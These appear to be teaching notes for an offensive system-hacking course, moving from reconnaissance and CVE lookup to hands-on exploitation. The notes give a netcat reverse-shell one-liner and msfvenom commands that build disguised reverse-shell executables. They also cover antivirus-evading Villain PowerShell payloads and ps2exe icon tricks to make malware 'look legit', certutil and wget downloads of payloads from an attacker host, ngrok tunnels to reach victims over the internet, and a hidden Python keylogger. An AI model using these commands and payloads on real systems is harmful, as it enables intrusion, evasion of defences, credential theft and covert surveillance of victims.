# System Security/Hacking

## What is System Hacking?

**System hacking** is defined as the compromise between computer systems and software to access the target computer and steal or misuse their sensitive information.
- For System Hacking, having deep knowledge on How Different Operating Systems And Protocols Work Is Very Essential thing.
- **Example**: To Exploit FTP servers, You have to understand how FTP works and what FTP is.
	- To Exploit Windows Systems you have to understand how Windows works and how you can hack it.
- System Hacking/Security is A Collection of Different Fields, You have to Understand Network Security,OSINT and Web Security.

## System Recon

- ○ Network Informations - Nmap 
	- ■ Addresses 
		- ● Physical 
		- ● Software 
	- ■ Topology 
- ○ System Informations - Nmap 
	- ■ Running Services(Ports) 
	- ■ Operating System 
- ○ User Informations - OSINT/Social Engineering 
	- ■ Username 
	- ■ Passwords 
	- ■ HostNames

## Exploitation Phase

-  The exploitation phase involves leveraging identified vulnerabilities to gain unauthorized access, execute commands, or control the target system. 
- We have Gathered the network Informations and more based on our previous Classes. 
- This Class Focuses on Exploitations of the Systems Based on our Recon Knowledge on the system

## Exploitation Techniques

There are 2 Kinds of ways to Exploit.

1. Finding New Vulnerability
	- ■ This Is when You Find A new Vulnerability that wasn't Discovered or Found By another Peoples. 
	- ■ This is Also Called **0-day Vulnerability**. 
	- ■ We Will Perform if We are Testing Softwares and Finding New things. 
	- ■ If We Found one it will be registered as a CVE( we will learn later ). 
	- ■ **Example**: Getting a New Way to Skip/bypass the samsung Face Unlock Process
2. Exploiting Existing Vulnerability
	- ○ Many Security Researchers Have Got Different Vulnerabilities on Different Softwares Upto Current Time 
	- ○ Humans Tend to Forget Updating their softwares. This leads us as a Penetration Tester to Exploit Their system just by using the previously Found Vulnerability. 
		- ■ Looking For CVE ( Big Softwares ) - Android,Linux Kernel 
		- ■ Looking For Known Vulnerabilities on Applications - XSS, SQLI,... 
	- ○ Example: Exploiting Windows 7 users just by using Windows 7 Vulnerability on the Current Users And more.

## Exploitation Methods

Computer Systems can Be Exploited Mainly in the following ways:

1. **Protocol Exploitation**: 
	- ● Exploit open ports and misconfigured services. 
	- ● Example: Exploiting FTP Anonymous Login. 
2. **Web Security Exploitation**: 
	- ● Leverage input validation flaws (e.g., Command Injection, File Upload). 
	- ● Example: Running Linux Commands Through a website. 
3. **System Exploitation**: 
	- ● Exploit 
	- ● weak passwords, outdated software, CVE, 0day Vulnerabilities. Example: Cracking passwords with a dictionary attack. 
4. **Social Engineering**: 
	- ● Use phishing attacks to 
	- ● deliver payloads. Example: Crafting an email with a malicious attachment.

## Common Vulnerabilities and Exposures / CVE

**CVE** stands for **Common Vulnerabilities and Exposures.**
- CVE is a glossary that classifies vulnerabilities.
	- ○ The glossary analyzes vulnerabilities and then uses the **Common Vulnerability Scoring System (CVSS)** to **evaluate the threat level of a vulnerability**. 
	- ○ The CVE glossary is a project dedicated to tracking and cataloging vulnerabilities in consumer software and hardware.
- It is maintained by the **MITRE Corporation** with funding from the US Division of Homeland Security.

## Common Vulnerability Scoring System / CVSS

Calculator: https://www.first.org/cvss/calculator/3-0

## MITRE

**MITRE** is a non-profit organization that operates multiple federally funded research and development centers (FFRDCs) in the United States.
- It supports government agencies in fields like cybersecurity, defense, healthcare, and homeland security
- Contributions
	- ○ **MITRE ATT&CK Framework**: ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally recognized cybersecurity framework developed by MITRE.
		- ■ It details the various tactics and techniques adversaries use during cyberattacks, mapped across different phases of an attack lifecycle (like initial access, persistence, privilege escalation, etc.).
	- ○ Common Vulnerabilities and Exposures / CVE
	- ○ … more
- Link: https://attack.mitre.org/

## MITRE Engenuity ATT&CK Framework and Lockheed Martin Cyber Kill Chain

```

The cyber chain                The ATT&CK framework
 1. Reconnaissance               1. Initial access
 2. Weaponization                2. Excution
 3. Delivery                     3. persistence
 4. Exploitation                 4. privilege escalation
 5. Installation                 5. Defense evasion
 6. Command and control          6. Credential access
 7. Action and Objectives        7. Discovery
                                 8. Lateral movement
                                 9. Collection and exfiltration
                                10.  command and control


```

## 1. ExploitDB

The Exploit Database is maintained by OffSec
- The Exploit Database is a CVE compliant archive of public exploits and corresponding vulnerable software, developed for use by penetration testers and vulnerability researchers.
- https://exploit-db.com

## 2. Mitre Search

Mitre Has Another site to search CVE’s Detail.
- Link: https://cve.mitre.org/cve/search_cve_list.html

## 3. searchsploit

There is A linux tool called “SearchSploit” That used to search from exploitDB server, and get the exploit.
```
>	sudo apt install searchsploit
>	searchsploit --help
>	searchsploit apache 2.7
```

## 4. Search Engines

You can get the Software CVE and Exploit, By Just Using regular Search engines. like google
- **Syntax** To use: 
	- ○ “Any Software” CVE 
	- ○ “Software with the Version” exploit
- **Example**: 
	- ○ “Windows 7” CVE 
	- ○ “Windows 11” Exploit 
	- ○ “Wondershare 5.60” CVE

## Exploitation technique ?

- Based on Our 4 Exploitation techniques, CVE Uses to Exploit the system with 
	- ○ Outdated Software and Misconfigurations
- we can get Previous Exploits and vulnerabilities.
- ThereFore, Remember anytime you Got a Software to test and if the Software is made with Big Organization like Microsoft and Apple. **Don’t Try to Look For new Bug, Instead try to Look For CVE’s**.

## Vulnerability Assessment

**Vulnerability Assessment** is a systematic process for identifying, analyzing, and prioritizing vulnerabilities in a mobile, Web, system or network.
- It helps organizations understand potential security weaknesses before attackers can exploit them, enabling proactive measures to reduce risk.
- On this Process, Cyber Security Professionals, use Different tools to test **For Known Vulnerabilities**. Here there is no Penetration test Work, we Just use Checklists.
- Common Vulnerability Assessment **Tools** 
	- ○ Nessus 
	- ○ Acunetix 
	- ○ OpenVAS 
	- ○ Nmap with NSE

## Nessus

**Nessus** is a widely used vulnerability scanner that identifies vulnerabilities, misconfigurations, and compliance issues.
- It provides detailed reports and recommendations for remediation.
-  https://www.tenable.com/products/nessus

## Acunetix

**Acunetix** is a web application vulnerability scanner designed to identify security issues in web applications and APIs.
- It focuses on finding vulnerabilities specific to web environments.

## OpenVAS (Open Vulnerability Assessment System)

An open-source tool that offers comprehensive vulnerability scanning and management features.
- It’s part of the Greenbone Vulnerability Management (**GVM**) framework.

## Nuclei

**Nuclei** is a modern, high-performance vulnerability scanner that leverages simple YAML-based templates. It empowers you to design custom vulnerability detection scenarios that mimic real-world conditions, leading to zero false positives.
- Link: https://github.com/projectdiscovery/nuclei
- **Installation**:
	- ○ `Sudo apt install golang `
	- ○ `go install -v`
	- http://github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
- Syntax:
	- `nuclei -u https://geezsecurity.com`

## Caution⚠

You Have to be sure of the false positives.

## Technique of Remote Access

● After Exploiting The Systems we will Get a shell. 
- ● Gaining a shell on a target system enables attackers to execute commands, transfer files, and escalate privileges
- There are 2 Types of shells, That an Attacker can access based on the Incoming Connection:
	- a. Bind Shell 
	- b. Reverse Shell

## Bind Shell

- A **bind shell** is a sort of setup where remote consoles are established with other computers over the network
- In Bind shell, **an attacker launches a service on the target computer**, to which the attacker can connect.
- In a bind shell, an attacker can connect to the target computer and execute commands on the target computer.
- To launch a bind shell, **the attacker must have the IP address of the victim** to access the target computer.

## Reverse Shells

- A reverse shell, also known as a remote shell or “connect-back shell,” takes advantage of the target **system's vulnerabilities** to initiate a shell session and then access the victim's computer.
- Reverse shells allow attackers to open ports to the target machines, forcing communication and enabling a complete takeover of the target machine.
- Therefore it is a severe security threat.
- This method is also commonly used in penetration tests.
- On reverse shells, the attacker will listen for any request on specific port, and the victim will start the request on that port, so we will have a shell. the victim may not sending the request intentionally. But if the attacker send him a link/malware that can start the reverse request that can leads to reverse shell.
- The Malware/Link in this case is called **Payload**.

## Netcat/nc

- ○ To listen on ports, 
- ○ To create connection on ports we can use this tool.
- It is a Back-End tool which can smoothly be cross utilized by other programs
- Used to Create a connection with any protocol/port you want or to create a listener on any port
- It is a tool That helps to create Reverse shells or Bind shells
- It is built in tool on kali and parrot but for windows you have to download it.
- Let's demonstrate with it…

## Payloads

Payload refers to the code or commands that are delivered and executed on a target system to perform a specific action, like gaining control, stealing information, creating reverse-shell or damaging data.
- In simpler terms, it's the part of an exploit that carries out the attacker's **intent after a vulnerability has been exploited**.
- **Example**: 
	- የሆነ ቤት ለመስረቅ, ክፍተቱ/Vulnerability ያለው የበራቸው መቀርቀርያ ስስ መሆኑ ከሆነ, በሩን መስበር **Exploit** ይባላል **Payload** ደግሞ በሩ ከተሰበረ በኋላ የምናደርገው ተግባር ነው።
	- ■ ይህም ወደ ውስጥ መግባት ወይም መሰለያ ቁሶችን መወርወር ሊሆን ይችላል.
- **Payloads** can be In Many formats and Programming languages.
	- You can use https://www.revshells.com/ site to **generate Bind / Reverse shell commands.**

1. On the attacker machine we started a listener…
	- -l : Listen 
	- -v: verbose 
	- -p: port 
	- -n: No-DNS resolution
```
>	nc -lvp 2222
```
2. On the victim i called the attacker IP on that specific port
```
>	nc 192.168.56.102 -e /bin/bash
```
This is Where we use payloads.

- As you see on the attacker machine we got reverse shell and we can interact with the victims PC.

## Revshell

https://www.revshells.com/

## Metasploit

The **Metasploit framework** is a very powerful tool which can be used by cybercriminals as well as ethical hackers to probe systematic vulnerabilities on networks and servers.
- It is written with **ruby**. 
- It has a lot of exploits for different kind of vulnerabilities and CVE’s
- It Provides you:
	- ○ **Exploits**,
	- ○ **Payloads**,
	- ○ **Auxiliaries**: Programs That will help to scan further on the services/protocols. 
	- ○ **Encoders**: Like Crypters
	- ○ **Listeners**,
	- ○ **Post-exploitation codes**: Used to perform further attack after we Exploit the system, like privilege Escalation

## Methodology

After Successful Enumeration and Scanning, We can Use Metasploit to Gain and Maintain Access.
- The Use of Metasploit,
	- ○ Making Payloads. 
	- ○ Exploiting Vulnerabilities.
- **MSF** the Framework contains Different Tools inside it.
	- ○ **Msfvenom**: A standalone tool for generating payloads and shellcode 
	- ○ **Msfconsole**: The primary Metasploit interface, which provides an interactive command-line interface to Metasploit. 
	- ○ **Msfdb**: A command-line tool for managing the Metasploit database. 
	- ○ …

## Let’s Begin

ON kali/parrot it is already installed, 
- To install it:
```
>	sudo apt update && sudo apt install metasploit-framework
``` 

## Payloads on MSF

In Metasploit, payloads and exploits are crucial components used to deliver and execute malicious code on a target system.
- They are located in /usr/share/metasploit-framework/modules/payloads
```
>	msfvenom -l payload
```

## 1. Payload Formatting

**Format**: OS/ Shell/ Connection

#### Operating Systems (OS):

-  **Windows**: Payloads designed to work with Windows operating systems. 
	- ○ **Example**: `windows/meterpreter/reverse_tcp `
- **Linux**: Payloads intended for Linux systems. 
	- ○ **Example**: `linux/x86/meterpreter/reverse_tcp `
- **macOS**: Payloads for macOS systems. 
	- ○ **Example**: `osx/x86/shell_reverse_tcp` 
- **Android**: Payloads for Android devices. 
	- ○ **Example**: `android/meterpreter/reverse_tcp `
- **FreeBSD**: Payloads for FreeBSD systems. 
	- ○ **Example**: `freebsd/x86/meterpreter/reverse_tcp`

#### Shell Types:

- **Meterpreter**: An advanced, dynamically extensible payload that provides extensive functionality and a variety of post-exploitation features.
	- **Example**:
```
	>	windows/meterpreter/reverse_tcp
```
- **Shell**: Provides basic command execution capabilities. Includes standard shell types like /bin/sh or /bin/bash on Unix-based systems and cmd.exe on Windows.
	- **Example**: 
```
	>	linux/x86/shell_reverse_tcp
```

NB. In metasploit terminals you can use `help` command.

#### Connection Types:

- **Reverse TCP**: The payload connects back to the attacker’s machine. Commonly used to bypass network security measures like firewalls and NAT. 
	- ○ **Example**: `windows/meterpreter/reverse_tcp` 
- **Bind TCP**: The payload listens on a specified port on the target machine, and the attacker connects to it. Useful when the attacker can’t receive incoming connections. 
	- ○ **Example**: `windows/meterpreter/bind_tcp` 
- **Reverse HTTPS**: Similar to reverse TCP, but uses HTTPS for encrypted communication. 
	- ○ **Example**: windows/meterpreter/reverse_https 
- **Bind HTTPS**: The payload listens for connections over HTTPS. 
	- ○ **Example**: `windows/meterpreter/bind_https`

## Staged vs. Non-Staged Payloads

Two types of payloads: 
1. Staged Payload 
2. Non-Staged Payload

## Staged Payloads

The payload on this type is Delivered in multiple parts:
- ○ First stage: Small loader is sent to the target. 
- ○ Second stage: The loader fetches and executes the larger payload.
- **Example**: 
	- ● `windows/meterpreter/reverse_tcp` sends a small piece of code first, then pulls the larger Meterpreter shell.
	- The Shell and Connection part is connected with “/”.
- The Purpose of Doing this is
	- The initial payload is small, reducing the chances of detection.
	- Allows for more complex functionality like Meterpreter sessions.
- Ex: የሆነ ፕሮግራም ላይ ተጋብዛቹ መድረክ መሪዉ ሲጠራችሁ

## Non-Staged Payloads

The Payload is Delivered in one single piece.
- **Example**: 
	- ● `windows/meterpreter_ reverse_tcp` delivers the entire Meterpreter payload in one go. 
		- a. The Shell and Connection part is connected with “`-`”
- **Purpose** 
	- Does not depend on additional network communication.
	- Only one network transaction is needed for the payload delivery.
- **The Downside is**
	- ○ The entire payload is sent at once, making it easier to detect. 
	- ○ Cannot handle as much complexity as a staged payload.

## Create a Payload for windows.

We will use metasploits Feature called msfvenom to create a payload.
```
~>	msfvenom -p windows/meterpreter/reverse_tcp LHOST=wlan0 LPORT=2020 -f exe > topsecret.exe

~>	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=2020 -f exe > topsecret.exe
```
-  As you see we have created the payload 
- Now we will send this to the victim 
- This is the malware for our reverse attack.

## Staged vs non staged

```
# staged ...has smaller size
~>	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=2020 -f exe > topsecret.exe

# non staged ...has larger size
~>	msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.1.7 LPORT=2020 -f exe > topsecret.exe

```

## Creating Payload for Linux

```
~>	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=2020 -f elf > topsecret.exe
```
In Linux, ELF (Executable and Linkable Format) is a common file format used for executable files, object code, shared libraries, and core dumps.
- **NB**. Extension for android is .apk

## shellcode

```
~>	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=2020
```
you can look the shell code now.

## Exploits on MSF

- **Exploits** are scripts or modules used to take advantage of vulnerabilities in a system. 
- Each exploit module in Metasploit is designed for a specific type of service and targets a particular operating system. 
- The exploits are located in `/usr/share/metasploit-framework/modules/exploits`
##### Exploit Example Formatting

- **Exploit**: `exploit/ windows/` 
	- **OS**: Windows `smb/ms17_010_eternalblue` 
	- **Vulnerability**: `CVE-2017-0144 (EternalBlue)` 
- **Exploit**: `exploit/ linux/ ftp/anonymous` 
	- **OS**: Linux 
	- **Vulnerability**: FTP vulnerability
<br>NB. If you get **FTP** vuln you can login **without password** with **`anonymous`**
<br>The Exploits are written in ruby. If you can Write ruby you can build your own script.

- To start it you can type, 
	- `msfconsole` 
	- `msfconsole -q`      ...you can Skip the banner part with this
	- `sudo msdb run`
- Then:
	- it gives you a new terminal
	- We can search any exploit for a system.
	- **Example**: for apache "`search apache`"
		- you can get apache exploits in dt versions

## Creating listener

1. We start Metasploit. 
2. We search for an exploit called **handler**
3. To use this exploit
```
msf6>	use exploit/multi/handler   ..or..>  use 29

(multi/handler)>	set LHOST 192.168.3.4
(multi/handler)>	set LPORT 4433
```
4. To run it 
```
(multi/handler)>	exploit    ..or..>   run
```

## To see details.

```
(multi/handler)>   options
(multi/handler)>   info
```
● **Commands** 
- **show info**: Detail about the exploit 
- **show options**: Displays the required objects to run a successful exploit(set LHOST, LPORT...)


## Problem.

If you want to test these encoders on your system(if it is vulnerable for some of reason .) ○ Just add -e and the encoder name from the list and create the payload.(msfvenom).
```
>	msfvenom -l encoders       ...lists metasploit's encoders

>	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=2020 -e x86/shikata_ga_nai -f exe > topsecret.exe
```

## So, we can’t Exploit???

At this time, there are some Frameworks that can bypass microsoft defender. 
- This means there are a lot of computers with just defender, right? 
- The tool is called **Villain** 
- You can clone it from github.
- https://github.com/t3l3machus/Villain

## Start

- It have its own some commands 
- This tool is Awesome for
	- ○ Creating payload 
	- ○ No need to setup listener 
	- ○ You can share the session you got with your friends, and hack together….
```
>	python3 villian.py

villain>	help
```

## Create Payload

```
Villain>   generate os=windows lhost=192.168.1.3
Villain>   generate os=windows lhost=wlan0 obfuscate
Villain>   generate os=windows lhost=192.168.1.3 encode
```
● Villain will give you powershell code 
- It is Easy to create. 
- You can use these 2 methods to make it undetectable. 
	-  obfuscate, encode

## The Payload

The Payload Villain Gives You is just a regular **Powershell Hoax** Shell payload as we saw previously, but villain used some bypassing techniques on it.

## Running

We can run the command we got on our victim’s powershell
- And it is really amazing, you can bypass microsoft defender.
-  **To see the sessions(hacked PC)** 
	- **`sessions`**
- **To get into that session** 
	- **`shell <id>`**
	- You can start the name and TAB
- **To terminate the session**
	- **`kill <id>`**
```
villain>   sessions
        ....you will see hacked devices...
villain>   shell 52ce01cc-c57bb157-5771ffc3
        ....you selected one device and got a shell...
villain>   kill 52ce01cc-c57bb157-5771ffc3
        ....session terminated...
```

## But… How do we send Powershell payloads???

- Now it is time to think like a hacker and getting plan how you will give the payload to the person. 
	- Lets Go, Team Social Engineers 😁 
- There are several ways 
	- You can create a exe file from that payload 
	- You can build/get a **autorun usb and do USB drop Attack**, **Rubber Ducky is Best**. 
	- You can do social engineering and help them to run it by their own.

## Powershell script to exe

https://ps2exe.azurewebsites.net/ -> You can also use some exe icon changer softwares to make it look legit.

## Additional …

➔ Other critical Framework that are heavily used by penetration testers during security assessments are:
- ◆ [Veil-Framework /Veil]( https://github.com/Veil-Framework/Veil ) - Veil Framework 
- ◆ [Shellter]( https://www.shellterproject.com/download/ ) - Shellter AV Evasion Artware 
- ◆ [Unicorn]( https://github.com/trustedsec/unicorn ) - Trustedsec 
- ◆ [MSFvenom Payload Creator (MSFPC)]( https://github.com/g0tmi1k/msfpc ) - g0tmi1k 
- ◆ [Venom]( https://github.com/r00t-3xp10it/venom) - Pedro Ubuntu 
- ◆ [Phantom-Evasion]( https://github.com/oddcod3/Phantom-Evasion ) - Diego Cornacchini 
- ◆ Empire
<br> ➔ These are not in the scope of this course, but feel free to research them in Your free time as they can provide a significant amount of insight into how professional penetration testers perform their assessments on high-value targets.
- https://www.youtube.com/watch?v=t6Lhp5ult1Q&pp=ygUPZW1waXJlIHBheWxvYWRz 
- https://www.youtube.com/watch?v=ErPKP4Ms28s
- Payload Creation is A part of a Malware development Field, To Go Further on Malware development, you have to learn Programming languages that run quickly and effective on any machines, Like:
	- ◆ C 
	- ◆ C++ 
	- ◆ Rust

## Payload on WAN

- As you saw we were trying the payloads on LAN network. Does it run on WAN? 
- To do this we will need a thing called **port forwarding**.
- **Port forwarding** inherently gives people outside of your network more access to your computer. Giving access or accessing unsafe ports can be risky, as threat actors and other people with malicious intents can then easily get full control of your device.

## Ngrok

**Ngrok** is one of the port forwarding tools.
- You can **host websites** with it 
- You can **listen to tcp** connections
<br>To set up:
- GOTO their website & create account 
	- ■ https://ngrok.com/ 
- Verify the ngrok through the email 

1. Download the ngrok 
2. Goto the download location 
	- ○ Extract it 
3. Add ngrok to the /usr/bin 
4. Copy the Auth-token 
5. Run it on your terminal

## Starting ngrok

There are 2 modes.
1. **TCP** -> `ngrok tcp` 
2. **HTTP** -> `ngrok http`
```
>	ngrok tcp 1234
>	ngrok http 1234
```
● It gives some informations on its own dashboard.(Eg. on` http://localhost:1234/`) 
- It have GUI too.

## 1. Ngrok HTTP mode

Let us make our local web server international
1. We need a webserver 
2. Http port forwarding with same port as our webserver
	- a. ngrok http 80

## For python server

```
>	nano index.html
>	python3 -m http.server 9090

>	ngrok http 9090
```

**NB**. The Free ngrok has a warning page before loading the original Page.

## 2. Ngrok TCP mode

- To Make our payloads work on WAN, We can follow this,
	- **Start** Ngrok 
		- ■ `ngrok tcp <PORT>`
	- **Exploit** 
		- ■ Make The **LHOST** to the Forwarding Link Given By ngrok 
		- ■ Make The **LPORT** to the port given after the forwarding link
	- **Listener** 
		- ■ Set the **LHOST** to localhost 
		- ■ Set the **LPORT** to the port you started the ngrok.
- On TCP mode, You won’t get Ngrok Logs for any request.<br>
 **IF** We Exploit the System Remotely.  The Good thing is the payload i Used, Bypassed both Windows Defender and Smadav Antivirus.  eg. **`powershell #2`** payloas in revshell

## Alternative - serveo.net

A Free and simple Website that gives port forwarding Service through SSH without any downloading and account creation.
- www.serveo.net   ...check if the server is up, mostly it is down.
```
>	ssh -R 80:localhost:3000 serveo.net
   ...it will give you an international link...
```
**`localhost:3000`** is your **listener**.
- **Now**, you can browse `localhost:3000/welcomesite`   for **local**.
- Browse `abc.serveo.net/welcomesite` for **international**.

## Alternative - LocalTunnel

**localtunnel** exposes your localhost to the world for easy testing and sharing!
- Made with node.js BUT WORKS FOR HTTP Tunneling only
- **Installation**:
	- ○ **Install npm**: `sudo apt install npm`
	- ○ **Install Localtunnel**: `sudo npm install -g localtunnel`
- **Syntax**: `npx localtunnel --port 8000`

## Cloudflared

you need two terminals
- **On 1st terminal**: make a phishing page on localhost.(eg on port 4444)
- **On the 2nd terminal**: generate a **WAN** link:
```
>	cloudrlared tunnel --url http://localhost:4444
   ...you will get a WAN link...
```

## Prevention

- Payloads are one of Malwares, so the prevention methods are same with Malware Protection methods.
- **REMEMBER**: if you have strong antivirus software you are 80% safe.

## File Transfer

File transfer techniques allow attackers to upload payloads or exfiltrate sensitive data during post-exploitation.
-  File Transfering Server: You can Start Python server and use it to download from it. 
	- ■ To start server: `python3 -m http.server 9090 `
- **For Windows** 
	- **Invoke-WebRequest**: 
		`iwr -Uri "http://[attacker_ip]:PORT/payload.exe" -OutFile "payload.exe"` 
	- **CertUtil**: 
		`certutil.exe -urlcache -split -f "http://[attacker_ip]:PORT/payload.exe" payload.exe` 
- **For Linux** 
	- **cURL**: `curl http://[attacker_ip]:PORT/file --output file` 
	- **Wget**: `wget http://[attacker_ip]:PORT/file`

## Example…

```
>	python3 -m http.server 9090
  ....running..
```
```
>	wget http:/192.168.7.8:9090/malware
   ...the malware is uploaded to the target...
```

## Default Passwords

**Default passwords**: are factory-set credentials for devices, software, and systems.
- These are often left unchanged by users, creating a security vulnerability.
- Identifying and exploiting default credentials can reveal potential security risks and misconfigurations in a system.
- Most Common are
	- Admin : admin 
	- Admin : passwords 
	- …
- Most Softwares and Devices Come with their Own default password, To get that we can you Search Engines with query of 
	- “Default Password for {SoftwareName}”. 
	- “Default login for {SoftwareName}”.
- Eg. on google: "default password for huawei router"

## Leaked Credentials

**Leaked credentials** can be a **goldmine** for penetration testing.
- Tools/Resources: 
	- **Dehashed**: Search for leaked credentials by email, username, or domain. 
	- **Have I Been Pwned (HIBP)**: Identify compromised email accounts or domains. 
	- **LeakBase**: Use for searching leaked database dumps. 
	- **OSINT Tools**: Check public dumps for credentials.
- **Task**: Obtain valid combinations of usernames/emails and passwords for testing purposes.
- Use the credentials to log in to the respective services (if authorized).

## Dehashed

https://dehashed.com/

## LeakBase

https://leakbase.io/

## Have I Been Pwned (HIBP)

https://haveibeenpwned.com/    - check if your email leaked.

## Advanced Persistent Threats ( APTs )

**Advanced Persistent Threats (APTs**) are sophisticated, targeted cyberattacks carried out by well-resourced groups to compromise and maintain unauthorized access to a system or network over an extended period.
- We can Classify The 3 Words(APT):
	- **Advanced**: Use of complex techniques, zero-day vulnerabilities, and customized malware. 
	- **Persistent**: Focus on long-term access without detection. 
	- **Threat**: Highly skilled attackers with significant resources, often backed by nation-states or organized groups.
- Objectives of APTs are Stealing sensitive data, intellectual property, Sabotaging critical infrastructure or operations, Stealing financial information or funds. 
- They Follow The Same CyberKill Chains, But they make it in Stealthy ways.
<br>**Techniques** used By APT: 
- Social Engineering 
- Exploitation of Zero-Day Vulnerabilities 
- Living off the Land (LotL) Techniques 
- Custom Malware 
- Data Exfiltration
<br>**Mitigating** APTs 
- Proactive Measures 
- Incident Response Planning 
- Zero Trust Architecture 
- Endpoint Security 
- Threat Hunting
<br>**Examples**: 
- **SolarWinds Attack (APT29)**: 
	- Compromised the supply chain to infiltrate multiple organizations. 
	- Highlighted the importance of third-party security assessments. 
- **WannaCry Ransomware (Lazarus Group)**: 
	- Exploited a vulnerability in SMB (EternalBlue) to spread globally. 
- **Stuxnet ( USA + Israel )** : 
	- Exploited Physical Nuclear Centrifuges.

# ADVANCED SYSTEM HACKING CONCEPTS

## Lateral Movement

- Lateral movement in cybersecurity refers to the techniques that cyber attackers use to **move through a network** in search of key data and assets **after gaining initial access**.
- It involves navigating from the initial point of entry to other systems within the same environment to expand the breach's scope and control additional resources.
- This tactic is commonly used in advanced persistent threats (APTs) where the attacker aims to remain undetected while escalating their privileges and accessing critical information or systems.

## Pivoting

- Pivoting in penetration testing is a technique in which the ethical hackers—also known as white-hat hackers—simulating the attack can **move from one system to another**.
- There are so many ways to pivot from 1 system to another. That is not Scope of this course. check them for future.

## Privilege Escalation

- privilege escalation attack is a cyberattack to gain illicit access of elevated rights, permissions, entitlements, or privileges beyond what is assigned for an identity, account, user, or machine.

## Exploiting Protocols

- The Another Way of Exploiting Systems, is By Exploiting The services Running on the machine. 
- There are many Protocols like, FTP,SMB,SSH,SMTP,SNMP,NFS… 
- Each of them can be Exploited in 2 ways 
	- When The System Admin Use, Older Version Software 
	- When They got Misconfigured. 
- On this topics You will have an assignment so you will learn that.

## Linux System Hacking

- As we all know, GNU/Linux is an Operating System (OS) assembled user the model of open-source software development and distribution and is based on Unix OS created by Linus Torvalds.
- As we know, Linux is considered to be the most secure OS to be hacked or cracked, but in the world of Hacking, **nothing is 100% secured.** (It is matter of time or skill).
- Hackers usually use the following techniques to hack the linux system.
	- Hack Linux using the SHADOW file. 
	- SSH key leak 
	- Remote Code Execution(RCE) 
	- Another technique commonly used by hackers is to bypass the user password option in Linux.(Privilege Escalation) 
	- The hacker detects the bug on kernel and tries to take advantage of it.(CVE)

## Windows System Hacking

- Windows is Very Broad Topic, than you think.
- As we learned Linux systems you have to learn Windows Systems too.
- You have to learn
	- Fundamental of Windows
	- DLL Hijacking 
	- Powershell Scripting and usage. 
	- Managing Services, Users 
	- Active Directory system

## Steganography

Steganography is **the practice of hiding a secret message inside of (or even on top of) something that is not secret**.
- These days, many examples of steganography involve embedding a secret piece of text inside of a picture.
- But also we can hide inside audio files and etc
- There are many **tools** for this.
	- The famous on is “**steghide**”
```
>	sudo apt install steghide
>	steghide embed -ef secret.txt -cf img.jpeg     #Hide text in image
>	steghide exteract -sf img.jpeg                # You will get the secret text file
>	cat secret.txt     # you can get the text file now
```
1. Download it 
2. To hide text in image 
3. To extract

## Caution

When you share these staged files, it doesn’t have to be compressed Or use USB,CD
- EG. If you want to share it in telegram, use the file format of image.

## Keylogging

Keyloggers are **activity-monitoring software programs or hardware device that give hackers access to your personal data**.
- The passwords and credit card numbers you type, the web pages you visit – all by logging your keyboard strokes.
- The software is installed on your computer, and records everything you type.

## Python Keylogger

```c
from pynput.keyboard import key,listener
import logging

log_dir=""

logging.basicCinfig(filename=(log_dir + 'key_log.txt'),level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(key):
	logging.info(str(key))

with listener(on_press=on_press) as listener:
	listener.join()

```
The file will be saved as .**pyw** this will make the file to now show any pop up but still it runs on background.
- You can see that in task manager
- When you run this , it will create a log file.


### PRACTICE PRACTICE PRACTICE!!

